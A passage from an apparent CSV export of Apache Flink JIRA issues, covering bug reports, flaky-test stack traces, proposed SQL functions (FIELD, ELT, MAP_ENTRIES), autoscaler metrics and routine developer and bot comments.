Is this a bug?",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Jun/23 09:28;yesorno;lookup_join_inner_join_type.jpg;https://issues.apache.org/jira/secure/attachment/13058842/lookup_join_inner_join_type.jpg",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 27 02:21:53 UTC 2023,,,,,,,,,,"0|z1idoo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/Jun/23 01:54;jark;[~yesorno] it works as expected. Adding a condition for {{dim.age > 10}} means {{dim.age}} shouldn't be NULL. ""LEFT JOIN + right record is not null"" can be optimized into INNER JOIN, they are equal.;;;","27/Jun/23 02:21;yesorno;[~jark]  Thanks for your response. Make sense to me.;;;",,,,,,,,,,,,,,,,,,,,,
The return value of PartitionableListState#get is inconsistent with the requirements of AppendingState,FLINK-32275,13539032,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,masteryhx,Weijie Guo,Weijie Guo,07/Jun/23 08:57,18/Aug/23 07:48,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / State Backends,,,,0,,,,"The java doc of {{AppendingState#get()}} states that if the state is empty, then this method should return {{null}}. But for it's child class {{PartitionableListState}}, It does return a empty list instead of {{null}}. This has caused some confusion ,especially {{AppendingState}} is a {{PublicEvolving}} API.",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-16310,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 07:48:03 UTC 2023,,,,,,,,,,"0|z1idko:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/Jun/23 08:58;Weijie Guo;[~masteryhx] Would you mind taking a look at this? Thanks.;;;","07/Jun/23 11:20;masteryhx;Thanks for reporting this. I think it's really a problem.

It may cause some potential issues if users rely on this to wirte their codes.

I'd like to prepare a pr to make PartitionableListState behaves like the comment of AppendingState.

BTW, I also found some classes using it without any check, like SimpleSource#initializeState, which is also needed to be modified.

WDYT? [~Weijie Guo] ;;;","07/Jun/23 12:21;Weijie Guo;[~masteryhx] Thanks for the quick reply! Let them talk to each other sounds good. As for {{SimpleSource#initializeState}}, adding a check to it is a good idea.;;;","18/Aug/23 07:48;masteryhx;I looked into related interface and implementation, found some implementation has to return empty list like UserFacingListState.
Just as FLINK-16310 said, we may need to fix the javadoc.;;;",,,,,,,,,,,,,,,,,,,
kafka class could not be found while using appliction mode.,FLINK-32274,13539023,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,SpongebobZ,SpongebobZ,07/Jun/23 08:21,08/Jun/23 02:23,04/Jun/24 20:41,08/Jun/23 02:23,1.14.5,,,,,,,,,,,,,,,,,,,,Client / Job Submission,,,,0,,,,"While using yarn-application mode to submit my app, it would throw an exception: `org.apache.kafka.common.config.ConfigException: Invalid value org.apache.kafka.common.serialization.StringDeserializer for configuration key.deserializer: Class org.apache.kafka.common.serialization.StringDeserializer could not be found.` I had defined KafkaProducer variation in my client code. And I think the kafka-clients dependency was already uploaded while submitting the app.

But I found it is ok in per-job mode.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-07 08:21:57.0,,,,,,,,,,"0|z1idio:",9223372036854775807,"try to replace `org.apache.kafka.common.serialization.StringSerializer` with `Class.forName(""org.apache.kafka.common.serialization.StringSerializer"")`",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
What is org.apache.flink.avro.generated.record_json?,FLINK-32273,13538978,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,tanee.kim,tanee.kim,07/Jun/23 01:18,28/Jun/23 12:48,04/Jun/24 20:41,28/Jun/23 12:48,,,,,,,,,,,,,,,,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",Table SQL / API,,,0,,,,"I'm trying to relay a topic from kafka to another kafka.

This is the original record in source topic.
{code:java}
""json"": {
        ""eventName"": ""event-ABC"",
        ...
    } {code}
The source is json format and sink is avro format with confluent-schema registry.

Here is my code.

 
{code:java}
tableEnv.executeSql(""CREATE TABLE source_table (..) WITH (
'connector'='kafka', 
'format'='json',
)"")

tableEnv.executeSql(""CREATE TABLE sink_table WITH (
'connector'='kafka',
'format'='avro-confluent',
..
) AS SELECT * FROM source_table"") {code}
If I run this code without 'value.avro-confluent.subject' configuration, the record is something like this.
{code:java}
{
    ""json"": {
        ""org.apache.flink.avro.generated.record_json"": {
            ""eventName"": {
                ""string"": ""event-ABC""
            },
           ..
         }
}      {code}
I don't understand why flink-avro inserts ""org.apache.flink.avro.generated.record_json"" between `json` and `eventName`.

Also `eventName` is not just 'event-ABC' but `string: event-ABC`.

 

Is this bug? or something I missed?

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 12:48:53 UTC 2023,,,,,,,,,,"0|z1id8o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 12:48;martijnvisser;For support questions, please post to the User mailing list, Stackoverflow or Slack. Jira is for bugs and/or new features, not for user support;;;",,,,,,,,,,,,,,,,,,,,,,
Expose LOAD_MAX as autoscaler metric,FLINK-32272,13538967,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,morhidi,morhidi,morhidi,06/Jun/23 21:47,10/Jun/23 05:59,04/Jun/24 20:41,10/Jun/23 05:59,,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,LOAD_MAX is a metric that helps identifying the busiest vertices a.k.a hot spots in job graph.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jun 10 05:59:03 UTC 2023,,,,,,,,,,"0|z1id68:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jun/23 05:59;gyfora;merged to main e40f108fbafc80d48971f883531be5137f3f6d1e;;;",,,,,,,,,,,,,,,,,,,,,,
Report RECOMMENDED_PARALLELISM as an autoscaler metric,FLINK-32271,13538958,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,morhidi,morhidi,morhidi,06/Jun/23 17:55,19/Jun/23 08:54,04/Jun/24 20:41,10/Jun/23 05:59,,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,It is beneficial to report the recommended parallelism and overlay it with the current parallelism on the same chart when auto scaler is running in advisor mode.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jun 10 05:59:26 UTC 2023,,,,,,,,,,"0|z1id48:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jun/23 05:59;gyfora;merged to main f9ec6361f09df4f5d34cd10185538a89d9417b4a;;;",,,,,,,,,,,,,,,,,,,,,,
Heartbeat timeout in AggregateReduceGroupingITCase.testAggOnLeftJoin on AZP,FLINK-32270,13538944,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,roman,Sergey Nuyanzin,Sergey Nuyanzin,06/Jun/23 15:04,25/Aug/23 22:35,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,Table SQL / Planner,,,0,stale-assigned,test-stability,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49590&view=logs&j=a9db68b9-a7e0-54b6-0f98-010e0aff39e2&t=cdd32e0b-6047-565b-c58f-14054472f1be&l=12613
{noformat}
Jun 03 02:28:48 	... 4 more
Jun 03 02:28:48 Caused by: java.util.concurrent.TimeoutException: Heartbeat of TaskManager with id c4f0f11f-a01f-4627-88f0-7cf92bc9994b timed out.
Jun 03 02:28:48 	... 30 more
Jun 03 02:28:48 

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 25 22:35:08 UTC 2023,,,,,,,,,,"0|z1id14:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 16:42;Sergey Nuyanzin;looks similar to FLINK-25903;;;","13/Jun/23 08:12;renqs;[~roman] [~akalashnikov] Could you take a look at this issue? Looks like similar to FLINK-25903;;;","26/Jul/23 09:54;renqs;Downgraded to Major as only it only appeared once in two months;;;","25/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,
CreateTableAsITCase.testCreateTableAsInStatementSet fails on AZP,FLINK-32269,13538937,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,jiabao.sun,Sergey Nuyanzin,Sergey Nuyanzin,06/Jun/23 14:37,29/Nov/23 01:55,04/Jun/24 20:41,29/Nov/23 01:55,,,,,,,,,,,,,,,1.17.3,1.18.1,1.19.0,,,,Tests,,,,0,auto-deprioritized-critical,test-stability,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49532&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=15797

{noformat}
Jun 01 03:40:51 03:40:51.881 [ERROR] Tests run: 4, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 104.874 s <<< FAILURE! - in org.apache.flink.table.sql.codegen.CreateTableAsITCase
Jun 01 03:40:51 03:40:51.881 [ERROR] CreateTableAsITCase.testCreateTableAsInStatementSet  Time elapsed: 40.729 s  <<< FAILURE!
Jun 01 03:40:51 org.opentest4j.AssertionFailedError: Did not get expected results before timeout, actual result: [{""before"":null,""after"":{""user_name"":""Bob"",""order_cnt"":1},""op"":""c""}, {""before"":null,""after"":{""user_name"":""Alice"",""order_cnt"":1},""op"":""c""}, {""before"":{""user_name"":""Bob"",""order_cnt"":1},""after"":null,""op"":""d""}, {""before"":null,""after"":{""user_name"":""Bob"",""order_cnt"":2},""op"":""c""}]. ==> expected: <true> but was: <false>
Jun 01 03:40:51 	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
Jun 01 03:40:51 	at org.junit.jupiter.api.AssertionFailureBuilder.buildAndThrow(AssertionFailureBuilder.java:132)
Jun 01 03:40:51 	at org.junit.jupiter.api.AssertTrue.failNotTrue(AssertTrue.java:63)
Jun 01 03:40:51 	at org.junit.jupiter.api.AssertTrue.assertTrue(AssertTrue.java:36)
Jun 01 03:40:51 	at org.junit.jupiter.api.Assertions.assertTrue(Assertions.java:211)
Jun 01 03:40:51 	at org.apache.flink.table.sql.codegen.SqlITCaseBase.checkJsonResultFile(SqlITCaseBase.java:168)
Jun 01 03:40:51 	at org.apache.flink.table.sql.codegen.SqlITCaseBase.runAndCheckSQL(SqlITCaseBase.java:111)
Jun 01 03:40:51 	at org.apache.flink.table.sql.codegen.CreateTableAsITCase.testCreateTableAsInStatementSet(CreateTableAsITCase.java:50)
Jun 01 03:40:51 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
Jun 01 03:40:51 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
Jun 01 03:40:51 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
Jun 01 03:40:51 	at java.lang.reflect.Method.invoke(Method.java:498)

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Nov 29 01:55:30 UTC 2023,,,,,,,,,,"0|z1iczk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 14:38;Sergey Nuyanzin;Hi [~lsy] it seems it is very similar to FLINK-31141
may be you'll take a look here as well?;;;","07/Jun/23 01:43;lsy;Yes. According to the exception, I think the root cause is the mini-batch related options we set are not work in streaming mode. We set

`

SET table.exec.mini-batch.enabled = true;
SET table.exec.mini-batch.size = 5;

`

in create_table_as_statementset_e2e.sql script, but seems that it doesn't work in streaming mode, cause the retract message is sent, so this is not a CTAS feature bug. One possible fix solution is that we just sent one record for every group key in source.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Critical but is unassigned and neither itself nor its Sub-Tasks have been updated for 14 days. I have gone ahead and marked it ""stale-critical"". If this ticket is critical, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-critical"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Critical, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;","29/Nov/23 01:55;leonard;Fixed in

master(1.19): 63996b5c7fe15d792e6a74d5323b008b9a762b52

release-1.18：b3b7240cc34e552273b26d8090d45e492474c9ea

release-1.17: 0053db03772a70c70de0516cc46f7ab363dc74f5;;;",,,,,,,,,,,,,,,,,,
KafkaTableITCase.testKafkaSourceSinkWithBoundedTimestamp failed to create topic,FLINK-32268,13538927,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Cannot Reproduce,renqs,Sergey Nuyanzin,Sergey Nuyanzin,06/Jun/23 13:13,16/Oct/23 07:30,04/Jun/24 20:41,16/Oct/23 07:30,kafka-4.0.0,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,stale-assigned,test-stability,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49661&view=logs&j=aa18c3f6-13b8-5f58-86bb-c1cffb239496&t=502fb6c0-30a2-5e49-c5c2-a00fa3acb203&l=22373

{noformat}
Jun 06 01:54:31 Caused by: java.util.concurrent.ExecutionException: org.apache.kafka.common.errors.TimeoutException: The request timed out.
Jun 06 01:54:31 	at java.util.concurrent.CompletableFuture.reportGet(CompletableFuture.java:357)
Jun 06 01:54:31 	at java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1908)
Jun 06 01:54:31 	at org.apache.kafka.common.internals.KafkaFutureImpl.get(KafkaFutureImpl.java:165)
Jun 06 01:54:31 	at org.apache.flink.streaming.connectors.kafka.table.KafkaTableTestBase.createTestTopic(KafkaTableTestBase.java:140)
Jun 06 01:54:31 	... 59 more


{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 31 22:35:09 UTC 2023,,,,,,,,,,"0|z1icxc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 07:56;Sergey Nuyanzin;probably another variation of https://issues.apache.org/jira/browse/FLINK-30879;;;","01/Aug/23 06:53;renqs;I checked the log but found no clue... Probably some internal instability inside Kafka testing container. 

I'll move it out of 1.18 version as Kafka connector has been moved out of Flink main repo. ;;;","31/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,,
Update testcontainers dependency to v1.18.3,FLINK-32267,13538926,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,06/Jun/23 13:00,20/Jun/23 08:21,04/Jun/24 20:41,07/Jun/23 09:49,,,,,,,,,,,,,,,1.18.0,elasticsearch-3.1.0,,,,,Test Infrastructure,,,,0,pull-request-available,,,"Among others there are
* Fixes the issue of missing root cause in container launch TimeoutException (e.g. SSLHandshakeException) 
* Make sure we don't hide exceptions from waitUntilContainerStarted

also full list is at 
https://github.com/testcontainers/testcontainers-java/releases/tag/1.18.0
https://github.com/testcontainers/testcontainers-java/releases/tag/1.18.1
https://github.com/testcontainers/testcontainers-java/releases/tag/1.18.2
https://github.com/testcontainers/testcontainers-java/releases/tag/1.18.3

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 20 08:21:52 UTC 2023,,,,,,,,,,"0|z1icx4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"07/Jun/23 09:49;martijnvisser;Fixed in master: 6b04e8c464e48746eb8a3c9ac8cee3fe04cf767f;;;","20/Jun/23 08:21;Sergey Nuyanzin;Merged to elastic search connector main: [7798196cc460622211751f0ca9ed9ea8046b8622|https://github.com/apache/flink-connector-elasticsearch/commit/7798196cc460622211751f0ca9ed9ea8046b8622];;;",,,,,,,,,,,,,,,,,,,,,
Kafka Source Continues Consuming Previous Topic After Loading Savepoint,FLINK-32266,13538849,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Not A Bug,,xiechenling,xiechenling,06/Jun/23 02:57,06/Jun/23 09:07,04/Jun/24 20:41,06/Jun/23 09:07,1.15.3,,,,,,,,,,,,,,,,,,,,Connectors / Kafka,,,,0,,,,"I encountered an issue with the Flink Kafka Connector's Kafka Source where it continues consuming data from a previously consumed topic even after loading a savepoint and configuring it to consume data from a different topic.

 

Steps to reproduce:
 # Set up the Kafka Source to consume data from Topic A.
 # Start the Flink job.
 # Stop the job and create a savepoint.
 # Modify the configuration to consume data from Topic B.
 # Load the job from the savepoint and start it.
 # Observe that the job consumes data from both Topic A and Topic B, instead of just Topic B.

 

Expected behavior:

After loading a savepoint and configuring the Kafka Source to consume data from a new topic, the job should only consume data from the newly configured topic.

 

Actual behavior:

The Kafka Source continues consuming data from the previous topic (Topic A), in addition to the newly configured topic (Topic B).","Flink version: 1.15.3
Kafka Connector version: 1.15.3 FLIP-27",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 06 09:07:22 UTC 2023,,,,,,,,,,"0|z1icg0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Jun/23 07:54;martijnvisser;That's not a bug, given that sources are part of Flink's snapshotting mechanism. If you want to change the topic, you will need to remove/invalidate this from the snapshot. ;;;","06/Jun/23 08:46;xiechenling;[~martijnvisser] It's too cumbersome for users to handle savepoint/checkpoint data themselves. With Kafka source, it is possible to filter the subscribed information based on the latest values set using KafkaSource.builder.setTopics(topic) during restoration. During the next savepoint/checkpoint, only the data related to the new topics will be stored.;;;","06/Jun/23 09:07;martijnvisser;[~xiechenling] It's a fair argument that this is too complex, but it's not a bug. Improving this is planned as part of https://cwiki.apache.org/confluence/display/FLINK/FLIP-246%3A+Multi+Cluster+Kafka+Source;;;",,,,,,,,,,,,,,,,,,,,
Use default classloader in jobmanager when there are no user jars for job,FLINK-32265,13538845,13417633,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,06/Jun/23 01:49,26/Jun/23 11:10,04/Jun/24 20:41,26/Jun/23 11:10,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"Currently job manager will create a new class loader for each flink job even it has no user jars, which may cause metaspace increasing. Flink can use system classloader for the jobs without jars.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 26 11:10:30 UTC 2023,,,,,,,,,,"0|z1icf4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Jun/23 11:10;chesnay;master: b3d0e51bdf9374848b03843115c97fa092e2e6b2;;;",,,,,,,,,,,,,,,,,,,,,,
Add FIELD support in SQL & Table API,FLINK-32264,13538812,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:31,11/Mar/24 12:44,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,stale-assigned,,"FIELD Function

Description
The FIELD function returns the position of a value in a list of values (val1, val2, val3, ...).

Syntax
The syntax for the FIELD function is:

FIELD( value, ...)
Parameters or Arguments
value
The value to find in the list.
val1, val2, val3, ...
The list of values that is to be searched.
Note
If value is not found in the list of values (val1, val2, val3, ...), the FIELD function will return 0.
If value is NULL, the FIELD function will return 0.
If list of values is NULL, return 0.

Example
Let's look at some  FIELD function examples and explore how to use the FIELD function.

For example:

 
{code:java}
SELECT FIELD('b', 'a', 'b', 'c', 'd', 'e', 'f');
Result: 2
SELECT FIELD('B', 'a', 'b', 'c', 'd', 'e', 'f');
Result: 2
SELECT FIELD(15, 10, 20, 15, 40);
Result: 3
SELECT FIELD('c', 'a', 'b');
Result: 0
SELECT FIELD('g', '');
Result: 0
SELECT FIELD(null, 'a', 'b', 'c');
Result: 0
SELECT FIELD('a', null);
Result: 0
{code}
see also:

MySQL:https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_field",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Aug 30 22:35:11 UTC 2023,,,,,,,,,,"0|z1ic7s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:36;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","05/Jun/23 19:20;Sergey Nuyanzin;[~bvarghese]
Can you please provide more info: about expected behavior and support by other engines with corresponding links?;;;","22/Jun/23 20:23;Sergey Nuyanzin;[~hanyuzheng] it is better to refer to the official documentation rather than some 3-rd party web sites which sometimes may be not accurate enough;;;","23/Jun/23 01:52;hanyuzheng;[~Sergey Nuyanzin] sure. Thank you for you comment. I will update the reference;;;","30/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,
Add ELT support in SQL & Table API,FLINK-32263,13538811,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:26,11/Mar/24 12:44,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,stale-assigned,,"Implement the elt function to extract the n-th input value from a list of inputs.

Description:
The elt function in the ETL pipeline extracts the value at the n-th position from a list of input values. It is similar to array indexing, where the first element is at position 1. This function provides a convenient way to retrieve specific elements from a list of inputs.

Syntax:

 
{code:java}
elt[n: int, *inputs: str] -> str or None{code}
 


Arguments:

n: The index of the input value to extract. It should be a positive integer.
*inputs: Variable-length arguments representing the list of inputs.


Returns:
The value at the n-th position in the list of inputs. If the index exceeds the length of the array, the function returns NULL. 

Examples:

Retrieving the second element from a list of strings:


{code:java}
elt(2, 'scala', 'java')
Output: 'java'{code}

Retrieving the second element from a list of mixed types:


{code:java}

result = elt(2, 'a', 1)
Output: 1{code}

See also:

 

spark:[https://spark.apache.org/docs/latest/api/sql/index.html#elt]

 

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Aug 29 22:35:04 UTC 2023,,,,,,,,,,"0|z1ic7k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jun/23 18:36;bvarghese;[~martijnvisser] can you please assign this ticket to [~hanyuzheng] ?;;;","05/Jun/23 19:24;Sergey Nuyanzin;[~bvarghese]
Can you please provide more info: about expected behavior and support by other engines with corresponding links?;;;","23/Jun/23 20:28;hanyuzheng;Now, we meet a problem. If we use ELT(n, ...), we need know n's value. Because n's value can tell me return which index value in ...   The problem is that n must be an literal value. See GetTypeStrategy class.

if we use normal test case ($(f0)).ELT(...), f0 is an nonliteral value, so do we have a way to deliver a literal value but not a nonliteral value in the test?

 

Now I can only use something like lit(1).elt(...) to do the test.

But I think it is not right way to do the test.

So I change the (...) to Row now. If I find a suitable way to solve test problem, I will change it to ELT(n, ...). Now is ElT(Row, n).;;;","26/Jun/23 02:44;jark;You can follow the way of [{{jsonArrayAgg}}|https://github.com/apache/flink/blob/master/flink-table/flink-table-api-java/src/main/java/org/apache/flink/table/api/Expressions.java#L915] which is defined as a static method. Users can call it in this way:

{code}
orders.select(ELT(lit(1), $(""f0"")));
{code};;;","27/Jun/23 05:07;hanyuzheng;[~jark] Thank you but how f0 stand for mixed type?;;;","29/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,
Add MAP_ENTRIES support in SQL & Table API,FLINK-32262,13538810,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hanyuzheng,bvarghese,bvarghese,05/Jun/23 18:25,20/Feb/24 17:46,04/Jun/24 20:41,20/Feb/24 17:44,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,stale-assigned,,"Implement the {{map_entries}} method to transform a map into an array of key-value structs.

Description: The current implementation of the {{map_entries}} method in the Flink library does not provide a way to transform a map into an array of key-value structs. This enhancement aims to add this functionality, allowing users to convert a map into a more structured format for further processing.

Syntax:

 
{code:java}
 

map_entries[map: Map[K, V]] -> Array[Struct<K, V>] {code}

Arguments:
 * {{{}map{}}}: The input map to be transformed.

Returns: An array of key-value structs obtained from the input map. Each struct consists of two fields: {{key}} of type {{K}} and {{value}} of type {{{}V{}}}.

Examples:
 # Transforming a map into key-value structs:

 
 
{code:java}
input_map = [1: 'apple', 2: 'banana', 3: 'cherry'] 
